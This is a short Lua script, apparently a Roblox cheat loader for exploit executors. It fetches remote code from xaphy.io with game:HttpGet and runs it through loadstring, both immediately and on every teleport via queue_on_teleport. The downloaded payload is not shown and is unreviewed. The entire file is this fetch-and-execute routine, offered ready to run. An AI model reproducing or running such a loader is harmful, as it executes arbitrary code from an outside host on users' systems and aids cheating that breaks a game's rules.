local script1 = [[
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    loadstring(game:HttpGet("https://xaphy.io/load", true))()
]]

local script2 = [[
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    loadstring(game:HttpGet("https://xaphy.io/load/loader/fasthatch/", true))()
]]

queue_on_teleport(script1)
queue_on_teleport(script2)

-- Execute both scripts now as well
if not game:IsLoaded() then
    game.Loaded:Wait()
end
loadstring(game:HttpGet("https://xaphy.io/load", true))()

if not game:IsLoaded() then
    game.Loaded:Wait()
end
loadstring(game:HttpGet("https://xaphy.io/load/loader/fasthatch/", true))()
